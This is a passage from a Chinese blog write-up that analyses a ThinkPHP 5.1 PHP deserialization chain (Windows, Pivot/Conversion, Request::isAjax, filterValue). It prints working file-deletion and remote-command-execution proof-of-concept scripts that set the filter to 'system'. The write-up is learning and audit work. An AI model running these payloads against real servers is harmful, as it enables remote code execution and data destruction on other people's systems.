$filter = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><span class="hljs-function">    </span>&#123;        ...        $name = (<span class="hljs-keyword">string</span>) $name;        <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;&#x27;</span> != $name) &#123;            <span class="hljs-comment">// 解析name</span>            <span class="hljs-keyword">if</span> (strpos($name, <span class="hljs-string">&#x27;/&#x27;</span>)) &#123;                <span class="hljs-keyword">list</span>($name, $type) = explode(<span class="hljs-string">&#x27;/&#x27;</span>, $name);            &#125;<span class="hljs-comment">//从数组$data中获取键为$name的value作为$data的新值，这个value必须是数组</span>            $data = <span class="hljs-keyword">$this</span>-&gt;getData($data, $name);            ...            <span class="hljs-keyword">if</span> (is_object($data)) &#123;<span class="hljs-comment">//$data不能是对象</span>                <span class="hljs-keyword">return</span> $data;            &#125;        &#125;        <span class="hljs-comment">// 解析过滤器</span><span class="hljs-comment">//**1433行的getFilter方法里如果 $filter = false 则 $filter = $this-&gt;filter; 因此$filter可控**</span>        $filter = <span class="hljs-keyword">$this</span>-&gt;getFilter($filter, $default);        <span class="hljs-keyword">if</span> (is_array($data)) &#123;            array_walk_recursive($data, [<span class="hljs-keyword">$this</span>, <span class="hljs-string">&#x27;filterValue&#x27;</span>], $filter);...        &#125; <span class="hljs-keyword">else</span> &#123;            <span class="hljs-keyword">$this</span>-&gt;filterValue($data, $name, $filter);        &#125;...        <span class="hljs-keyword">return</span> $data;    &#125;</code></pre><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filterValue</span>(<span class="hljs-params">&amp;$value, $key, $filters</span>)</span><span class="hljs-function"></span>&#123;    $default = array_pop($filters);    <span class="hljs-keyword">foreach</span> ($filters <span class="hljs-keyword">as</span> $filter) &#123;        <span class="hljs-keyword">if</span> (is_callable($filter)) &#123;            <span class="hljs-comment">// 调用函数或者方法过滤</span>            $value = call_user_func($filter, $value);        &#125;...&#123;</code></pre><p>查找input方法的调用，有7处</p><p><img src="/img/photo/Untitled.jpg" alt="调用input的方法"></p><p>由于param方法第一个参数可控，从这里入手</p><p>接下来寻找控制$name的方法</p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">param</span>(<span class="hljs-params">$name = <span class="hljs-string">&#x27;&#x27;</span>, $default = <span class="hljs-literal">null</span>, $filter = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">$this</span>-&gt;mergeParam) &#123;        ...    &#125;    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> === $name) &#123;        ...    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;input(<span class="hljs-keyword">$this</span>-&gt;param, $name, $default, $filter);&#125;</code></pre><p>查找调用了param的方法</p><p>显然这里isAjax和isPjax都能控制</p><p><img src="/img/photo/Untitled1.jpg" alt="isAjax和isPjax"></p><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isAjax</span>(<span class="hljs-params">$ajax = <span class="hljs-literal">false</span></span>)</span><span class="hljs-function"></span>&#123;    $value  = <span class="hljs-keyword">$this</span>-&gt;server(<span class="hljs-string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>);    $result = <span class="hljs-string">&#x27;xmlhttprequest&#x27;</span> == strtolower($value) ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> === $ajax) &#123;        <span class="hljs-keyword">return</span> $result;    &#125;    $result           = <span class="hljs-keyword">$this</span>-&gt;param(<span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;var_ajax&#x27;</span>]) ? <span class="hljs-literal">true</span> : $result;    <span class="hljs-keyword">$this</span>-&gt;mergeParam = <span class="hljs-literal">false</span>;    <span class="hljs-keyword">return</span> $result;&#125;</code></pre><p>到这里就构造完成了，只需要使Windows类里面的$filename为可以调用Conversion类的__toString方法的对象，使Conversion类里的$relation对象为Request类的实例，用__call调用isAjax方法，控制这些方法里面的参数，最终就可以调用input方法，并执行任意命令。</p><p>怎么去处理前面__call方法的$args数组里强加的$this对象？</p><p>__call实际调用的是isAjax，$args第一个参数$this对象会传递给isAjax方法的唯一一个参数$ajax，这并不影响后面$this-&gt;param($this-&gt;config[‘var_ajax’])的调用，因此这里不受$this对象的影响。</p><p>PS：</p><p>网上看到的文章里面的POC基本不能用，暂时不知道具体原因（还有些细节不太清楚，比如回显怎么整的），但是调试的时候发现是input方法里面的$data参数出了问题，往回找看见是在param方法里面对$this-&gt;param(也就是input的$data参数)做了一定修改，于是加上了protected $mergeParam=true;绕过了里面的修改，然后加上protected $param = [];设定$data，这才成功RCE，但美中不足的是没有回显，别人的POC都是有回显的，只能外带了。</p><h1 id="任意文件删除POC"><a href="#任意文件删除POC" class="headerlink" title="任意文件删除POC"></a>任意文件删除POC</h1><pre><code class="hljs php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pipes</span></span>&#123;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Pipes</span></span><span class="hljs-class"></span>&#123;<span class="hljs-keyword">private</span> $files = [];<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">$this</span>-&gt;files=[<span class="hljs-string">&#x27;需要删除文件的路径&#x27;</span>];&#125;&#125;<span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> Windows()));</code></pre><h1 id="RCE-POC-5-1-16-5-1-40"><a href="#RCE-POC-5-1-16-5-1-40" class="headerlink" title="RCE POC 5.1.16-5.1.40"></a>RCE POC 5.1.16-5.1.40</h1><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>;<span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span>&#123;    <span class="hljs-keyword">protected</span> $append = [];    <span class="hljs-keyword">private</span> $data = [];    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;append = [<span class="hljs-string">&quot;poc&quot;</span>=&gt;[<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot; &quot;</span>]];        <span class="hljs-keyword">$this</span>-&gt;data = [<span class="hljs-string">&quot;poc&quot;</span>=&gt;<span class="hljs-keyword">new</span> Request()];    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Request</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">protected</span> $hook = [];    <span class="hljs-keyword">protected</span> $filter = <span class="hljs-string">&quot;system&quot;</span>;    <span class="hljs-keyword">protected</span> $mergeParam=<span class="hljs-literal">true</span>;    <span class="hljs-keyword">protected</span> $param = [];    <span class="hljs-keyword">protected</span> $config = [        <span class="hljs-comment">// 表单请求类型伪装变量</span>        <span class="hljs-string">&#x27;var_method&#x27;</span>       =&gt; <span class="hljs-string">&#x27;_method&#x27;</span>,        <span class="hljs-comment">// 表单ajax伪装变量</span>        <span class="hljs-string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="hljs-string">&#x27;_ajax&#x27;</span>,        <span class="hljs-comment">// 表单pjax伪装变量</span>        <span class="hljs-string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="hljs-string">&#x27;_pjax&#x27;</span>,        <span class="hljs-comment">// PATHINFO变量名 用于兼容模式</span>        <span class="hljs-string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="hljs-string">&#x27;s&#x27;</span>,        <span class="hljs-comment">// 兼容PATH_INFO获取</span>        <span class="hljs-string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="hljs-string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="hljs-string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="hljs-string">&#x27;REDIRECT_URL&#x27;</span>],        <span class="hljs-comment">// 默认全局过滤方法 用逗号分隔多个</span>        <span class="hljs-string">&#x27;default_filter&#x27;</span>   =&gt; <span class="hljs-string">&#x27;&#x27;</span>,        <span class="hljs-comment">// 域名根，如thinkphp.cn</span>        <span class="hljs-string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,        <span class="hljs-comment">// HTTPS代理标识</span>        <span class="hljs-string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,        <span class="hljs-comment">// IP代理获取标识</span>        <span class="hljs-string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="hljs-string">&#x27;HTTP_X_REAL_IP&#x27;</span>,        <span class="hljs-comment">// URL伪静态后缀</span>        <span class="hljs-string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="hljs-string">&#x27;html&#x27;</span>,    ];    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;filter = <span class="hljs-string">&quot;system&quot;</span>;<span class="hljs-comment">//回调时调用的PHP函数</span>        <span class="hljs-keyword">$this</span>-&gt;config = [<span class="hljs-string">&quot;var_ajax&quot;</span>=&gt;<span class="hljs-string">&#x27;&#x27;</span>];<span class="hljs-comment">//在isAjax方法传递给param方法的$name绕过param方法的一些操作，但主要是为了绕过input方法里面对$data的改变</span>        <span class="hljs-keyword">$this</span>-&gt;hook = [<span class="hljs-string">&quot;visible&quot;</span>=&gt;[<span class="hljs-keyword">$this</span>,<span class="hljs-string">&quot;isAjax&quot;</span>]];<span class="hljs-comment">//在__call里面调用isAjax</span>        <span class="hljs-keyword">$this</span>-&gt;mergeParam=<span class="hljs-literal">true</span>;<span class="hljs-comment">//绕过param方法里的一些操作</span>        <span class="hljs-keyword">$this</span>-&gt;param=[<span class="hljs-string">&quot;calc&quot;</span>,<span class="hljs-string">&quot;&quot;</span>];<span class="hljs-comment">//input方法的$data,也是即将执行的命令</span>    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>;<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Conversion</span>;<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Pivot</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">private</span> $files = [];    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;files=[<span class="hljs-keyword">new</span> Pivot()];    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>;<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><span class="hljs-class"></span>&#123;&#125;<span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">process</span>\<span class="hljs-title">pipes</span>\<span class="hljs-title">Windows</span>;<span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> Windows()));<span class="hljs-meta">?&gt;</span></code></pre><p>还有几个问题：</p><p>为什么这里要有一个Pivot类？</p><p>这个Pivot类是怎么和Windows类产生联系的？</p><p>以上问题在这里找到了答案</p><p><a href="https://www.freebuf.com/column/221946.html">https://www.freebuf.com/column/221946.html</a></p><p><img src="/img/photo/Untitled2.jpg" alt="result1"></p><h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ol><li>类里的全局变量反序列化时是可控的，也就是说$this-&gt;xxx这种可控</li><li>call($method,$args)方法的使用细节，调用不存在的方法时会交给这个方法处理，方法名会传递给$method,参数会传递给$args</li><li>PHP的trait代码复用，用use导入后功能类似继承，优先级比继承高，比派生类低，POC里Windows类调用的Pivot类的toString 方法，查看可以发现Pivot里并没有 toString方法，但是Pivot继承的Model导入了Conversion类，这个__toString方法其实就是trait声明的Conversion类里的</li><li>一些PHP常用数据处理函数和回调函数的使用方法 <a href="https://www.notion.so/PHP-ae2238fe5d754e6081f486c190735010">https://www.notion.so/PHP-ae2238fe5d754e6081f486c190735010</a></li><li>对这种比较复杂的框架如何构造PHP反序列化POC有了一点了解</li></ol><h1 id="未解决的问题"><a href="#未解决的问题" class="headerlink" title="未解决的问题"></a>未解决的问题</h1><ol><li>文件上传的怎么利用？phar文件反序列化？有什么限制？</li><li>自己写个POC。</li><li>怎么修复防御？</li><li>为什么网上的POC会出错？</li></ol><h1 id="吐槽"><a href="#吐槽" class="headerlink" title="吐槽"></a>吐槽</h1><p>由于开发只懂一点点(也就只能写点简单的控制器，模块)，函数都是哪里不会查哪里，加上头一回分析这种框架里面的漏洞，过程十分艰辛，一度想过放弃，昨天上午就想看其他的来着，困扰我一两天的$this对象在调试代码的时候明白怎么回事了，加上网上POC都用不了，气得我愤而调试改POC，找到了解决办法（给我凑出一个POC来），这才完成大部分漏洞代码的理解。真的好吃力，但是收获也挺多的。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/6619#toc-1">https://xz.aliyun.com/t/6619</a></p><p><a href="https://xz.aliyun.com/t/6467#toc-3">https://xz.aliyun.com/t/6467</a></p><p><a href="https://www.p2hp.com/phpfuncs.html">https://www.p2hp.com/phpfuncs.html</a>  </p><p><a href="https://www.freebuf.com/column/221946.html">https://www.freebuf.com/column/221946.html</a></p><p><a href="https://paper.seebug.org/1040/">https://paper.seebug.org/1040/</a></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
      <category>反序列化</category>
      
    </categories>
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
